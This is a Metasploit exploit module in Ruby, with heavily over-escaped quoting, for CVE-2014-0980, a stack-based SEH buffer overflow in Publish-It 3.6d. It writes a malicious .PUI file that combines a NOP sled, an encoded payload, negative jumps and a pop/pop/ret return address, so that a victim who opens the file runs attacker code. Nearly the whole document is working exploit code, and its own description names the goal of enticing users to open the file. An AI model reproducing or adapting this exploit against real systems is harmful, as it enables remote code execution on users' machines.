##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require \\\\\\\'msf/core\\\\\\\'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      \\\\\\\'Name\\\\\\\'    => \\\\\\\'Publish-It PUI Buffer Overflow (SEH)\\\\\\\',
      \\\\\\\'Description\\\\\\\'  => %q{
          This module exploits a stack based buffer overflow in Publish-It when
          processing a specially crafted .PUI file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of Publish-It to open a malicious .PUI file.
      },
      \\\\\\\'License\\\\\\\'    => MSF_LICENSE,
      \\\\\\\'Author\\\\\\\'    =>
        [
          \\\\\\\'Daniel Kazimirow\\\\\\\',  # Original discovery
          \\\\\\\'Andrew Smith \\\\\\\"jakx_\\\\\\\"\\\\\\\',  # Exploit and MSF Module
        ],
      \\\\\\\'References\\\\\\\'  =>
        [
          [ \\\\\\\'OSVDB\\\\\\\', \\\\\\\'102911\\\\\\\' ],
          [ \\\\\\\'CVE\\\\\\\', \\\\\\\'2014-0980\\\\\\\' ],
          [ \\\\\\\'EDB\\\\\\\', \\\\\\\'31461\\\\\\\' ]
        ],
      \\\\\\\'DefaultOptions\\\\\\\' =>
        {
          \\\\\\\'ExitFunction\\\\\\\' => \\\\\\\'process\\\\\\\',
        },
      \\\\\\\'Platform\\\\\\\'  => \\\\\\\'win\\\\\\\',
      \\\\\\\'Payload\\\\\\\'  =>
        {
          \\\\\\\'BadChars\\\\\\\' => \\\\\\\"\\\\\\\\x00\\\\\\\\x0b\\\\\\\\x0a\\\\\\\",
          \\\\\\\'DisableNops\\\\\\\' => true,
          \\\\\\\'Space\\\\\\\' => 377
        },
      \\\\\\\'Targets\\\\\\\'    =>
        [
          [ \\\\\\\'Publish-It 3.6d\\\\\\\',
            {
              \\\\\\\'Ret\\\\\\\'     =>  0x0046e95a, #p/p/r | Publish.EXE
              \\\\\\\'Offset\\\\\\\'  =>  1082
            }
          ],
        ],
      \\\\\\\'Privileged\\\\\\\'  => false,
      \\\\\\\'DisclosureDate\\\\\\\'  => \\\\\\\'Feb 5 2014\\\\\\\',
      \\\\\\\'DefaultTarget\\\\\\\'  => 0))

    register_options([OptString.new(\\\\\\\'FILENAME\\\\\\\', [ true, \\\\\\\'The file name.\\\\\\\', \\\\\\\'msf.pui\\\\\\\']),], self.class)

  end

  def exploit

    path = ::File.join(Msf::Config.data_directory, \\\\\\\"exploits\\\\\\\", \\\\\\\"CVE-2014-0980.pui\\\\\\\")
    fd = File.open(path, \\\\\\\"rb\\\\\\\")
    template_data = fd.read(fd.stat.size)
    fd.close

    buffer = template_data
    buffer << make_nops(700)
    buffer << payload.encoded
    buffer << make_nops(target[\\\\\\\'Offset\\\\\\\']-payload.encoded.length-700-5)
    buffer << Rex::Arch::X86.jmp(\\\\\\\'$-399\\\\\\\') #long negative jump -399
    buffer << Rex::Arch::X86.jmp_short(\\\\\\\'$-24\\\\\\\') #nseh negative jump
    buffer << make_nops(2)
    buffer << [target.ret].pack(\\\\\\\"V\\\\\\\")

    print_status(\\\\\\\"Creating \\\\\\\'#{datastore[\\\\\\\'FILENAME\\\\\\\']}\\\\\\\' file ...\\\\\\\")
    file_create(buffer)

  end
end